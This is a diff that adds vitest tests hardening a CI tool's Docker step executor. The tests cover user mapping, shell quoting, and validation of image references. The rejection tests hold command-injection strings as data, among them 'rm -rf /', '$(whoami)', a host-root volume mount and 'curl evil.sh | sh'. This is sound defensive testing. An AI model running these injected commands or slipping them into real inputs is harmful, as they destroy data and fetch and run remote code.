@@ -1,6 +1,6 @@
 import { describe, it, expect, vi, beforeEach } from "vitest";
 import { Readable } from "node:stream";
-import { executeStep } from "../step-executor";
+import { executeStep, buildDockerCommand, isValidImageRef } from "../step-executor";
 import type { LogStreamer } from "../../logging/log-streamer";
 
 function makeSubprocess(
@@ -197,6 +197,104 @@ describe("executeStep", () => {
       expect.anything(),
       expect.objectContaining({
         env: expect.objectContaining({ MY_VAR: "test-value" }),
+      }),
+    );
+  });
+});
+
+describe("docker step hardening", () => {
+  let mockExeca: ReturnType<typeof vi.fn>;
+
+  beforeEach(async () => {
+    vi.clearAllMocks();
+    vi.restoreAllMocks();
+    const mod = await import("execa");
+    mockExeca = mod.execa as unknown as ReturnType<typeof vi.fn>;
+    mockExeca.mockImplementation(() => makeSubprocess(0, false));
+  });
+
+  it("runs the step container as the invoking user when uid/gid are available", async () => {
+    vi.spyOn(process, "getuid").mockReturnValue(1234);
+    vi.spyOn(process, "getgid").mockReturnValue(5678);
+
+    await executeStep({
+      command: "npm test",
+      cwd: "/tmp/workspace",
+      image: "node:20",
+      logStreamer: createMockLogStreamer(),
+    });
+
+    const [, args] = mockExeca.mock.calls[0];
+    expect(args[1]).toContain("--user 1234:5678");
+  });
+
+  it("omits --user when no host user is available (e.g. Windows)", () => {
+    const cmd = buildDockerCommand({
+      image: "node:20",
+      cwd: "/tmp/ws",
+      command: "echo hi",
+      containerName: "deployx-step-abc",
+      user: null,
+    });
+
+    expect(cmd).not.toContain("--user");
+  });
+
+  it("single-quotes the image, workspace path and command", () => {
+    const cmd = buildDockerCommand({
+      image: "ghcr.io/org/app:1.2.3",
+      cwd: "/tmp/my ws",
+      command: "echo 'hi'",
+      containerName: "deployx-step-abc",
+      user: "1000:1000",
+    });
+
+    expect(cmd).toContain("'ghcr.io/org/app:1.2.3' sh -c");
+    expect(cmd).toContain("-v '/tmp/my ws:/workspace'");
+    expect(cmd).toContain("--name 'deployx-step-abc'");
+    expect(cmd.endsWith(`sh -c 'echo '\\''hi'\\'''`)).toBe(true);
+  });
+
+  it.each([
+    "node:20; rm -rf /",
+    "node:20 && echo pwned",
+    "node $(whoami)",
+    "node:20`id`",
+    "-v /:/host alpine",
+    "node:20\nalpine",
+    "",
+  ])("rejects unsafe image reference %j", (image) => {
+    expect(isValidImageRef(image)).toBe(false);
+  });
+
+  it.each([
+    "node:20",
+    "alpine",
+    "ghcr.io/org/app:abc1234",
+    "localhost:5000/team/app:v1.2_3-rc",
+    "node@sha256:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef",
+  ])("accepts image reference %j", (image) => {
+    expect(isValidImageRef(image)).toBe(true);
+  });
+
+  it("fails the step without spawning anything when the image is unsafe", async () => {
+    const logStreamer = createMockLogStreamer();
+
+    const result = await executeStep({
+      command: "npm test",
+      cwd: "/tmp/workspace",
+      image: "node:20; curl evil.sh | sh",
+      logStreamer,
+      stepRunId: "s1",
+    });
+
+    expect(result.exitCode).toBe(1);
+    expect(mockExeca).not.toHaveBeenCalled();
+    expect(logStreamer.push).toHaveBeenCalledWith(
+      expect.objectContaining({
+        level: "error",
+        message: expect.stringContaining("Invalid Docker image reference"),
+        step_run_id: "s1",
       }),
     );
   });
